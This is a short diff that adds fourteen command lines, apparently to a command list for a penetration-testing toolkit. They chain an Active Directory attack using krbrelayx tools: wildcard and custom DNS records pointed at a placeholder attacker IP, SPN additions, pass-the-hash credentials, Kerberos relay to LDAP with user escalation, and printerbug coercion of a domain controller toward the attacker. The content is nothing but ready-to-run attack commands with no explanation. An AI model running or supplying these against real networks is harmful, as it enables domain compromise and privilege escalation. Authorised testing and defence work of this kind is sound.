@@ -1,0 +1,14 @@
+dnstool.py -u "$DOMAIN"\\"$USER" -p "$PASSWORD" --record '*' --action query "$DC_HOST"
+dnstool.py -u "$DOMAIN"\\"$USER" -p "$PASSWORD" --record '*' --action add --data "$ATTACKER_IP" "$DC_HOST"
+addspn.py -u "$DOMAIN"\\"$USER" -p "$PASSWORD" -t SV01 -s "HTTP/EXEGOL-01.$DOMAIN" --additional "$DC_HOST"
+addspn.py -u "$DOMAIN"\\'SV01$' -p "ffffffffffffffffffffffffffffffff":"$NT_HASH" -s "HOST/EXEGOL-01.$DOMAIN" --additional "$DC_HOST"
+krbrelayx.py --krbpass "$PASSWORD" --krbsalt DOMAIN.LOCALSV01 -t ldap://"$DC_HOST" --escalate-user "$USER"
+krbrelayx.py -aesKey "9ff86898afa70f5f7b9f2bf16320cb38edb2639409e1bc441ac417fac1fed5ab"
+krbrelayx.py --krbhexpass "$UD_HEXPASSWORD" --krbsalt "DOMAIN.LOCALhostcomputer.domain.local"
+dnstool.py -u "$DOMAIN"\\"$USER" -p "$PASSWORD" --action add -r "EXEGOL-01.$DOMAIN" -d "$ATTACKER_IP" "$DC_HOST"
+dnstool.py -u "$DOMAIN"\\"$USER" -p "$PASSWORD" --action add -r "EXEGOL-01.$DOMAIN" -d "$ATTACKER_IP" "$DC_HOST" --forest
+dnstool.py -u "$DOMAIN"\\"$USER" -p "$PASSWORD" --action remove -r "EXEGOL-01.$DOMAIN" -d "$ATTACKER_IP" "$DC_HOST"
+dnstool.py -u "$DOMAIN"\\"$USER" -p "$PASSWORD" --action remove -r "EXEGOL-01.$DOMAIN" -d "$ATTACKER_IP" "$DC_HOST" --forest
+dnstool.py -u "$DOMAIN"\\"$USER" -p "$PASSWORD" --action query -r "EXEGOL-01.$DOMAIN" "$DC_HOST"
+dnstool.py -u "$DOMAIN"\\"$USER" -p "ffffffffffffffffffffffffffffffff":"$NT_HASH" --action query -r "EXEGOL-01.$DOMAIN" "$DC_HOST"
+printerbug.py "$DOMAIN"/"$USER":"$PASSWORD"@"$DC_HOST" "$ATTACKER_IP"
